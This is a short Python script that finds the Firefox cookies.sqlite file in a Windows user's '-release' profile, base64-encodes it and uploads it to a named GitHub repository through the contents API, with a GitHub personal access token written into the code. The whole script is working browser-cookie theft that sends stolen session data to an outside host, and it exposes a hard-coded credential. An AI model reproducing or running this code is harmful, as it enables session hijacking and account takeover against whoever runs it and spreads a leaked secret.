import requests
import base64
import os
import glob

def find_firefox_profile_directory():
    appdata_dir = os.getenv("APPDATA")
    firefox_profiles_dir = os.path.join(appdata_dir, "Mozilla", "Firefox", "Profiles")
    return firefox_profiles_dir

def find_cookies_file(directory):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            if file_name.lower() == "cookies.sqlite":
                return os.path.join(root, file_name)
    return None

# Find the Firefox profiles directory
firefox_profiles_dir = find_firefox_profile_directory()

if firefox_profiles_dir:
    # Search for the folder ending in "-release"
    release_folder = None
    for dir_name in glob.glob(os.path.join(firefox_profiles_dir, "*-release")):
        if os.path.isdir(dir_name):
            release_folder = dir_name
            break

    # Check if the release folder was found
    if release_folder:
        # Search for the cookies.sqlite file within the release folder
        cookies_file = find_cookies_file(release_folder)

        # Check if the file was found
        if cookies_file:
            print("Cookies file found:", cookies_file)
        else:
            print("Cookies file not found.")
    else:
        print("Release folder not found.")
else:
    print("Firefox profiles directory not found.")

def upload_file_to_github(repo_owner, repo_name, file_path, github_token):
    # Read the file content
    with open(file_path, "rb") as file:
        file_content = file.read()

    # Encode the file content as base64
    encoded_content = base64.b64encode(file_content).decode("utf-8")

    # Set the file name from the provided file path
    file_name = file_path.split("/")[-1]

    # Set the API endpoint URL
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/cookies.sqlite"

    # Set the request headers
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Content-Type": "application/json"
    }

    # Create the request payload
    data = {
        "message": "Upload file",
        "content": encoded_content
    }

    # Send the POST request to create the file
    response = requests.put(url, headers=headers, json=data)

    # Check the response status
    if response.status_code == 201:
        print("File uploaded successfully.")
    else:
        print("Failed to upload file.")
        print("Response:", response.text)

# Set your GitHub repository details
repo_owner = "martinhofigueiredo"
repo_name = "SSR"

# Set the full path to the file
file_path = cookies_file

# Set your GitHub personal access token
github_token = "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"

# Upload the file to GitHub
upload_file_to_github(repo_owner, repo_name, file_path, github_token)
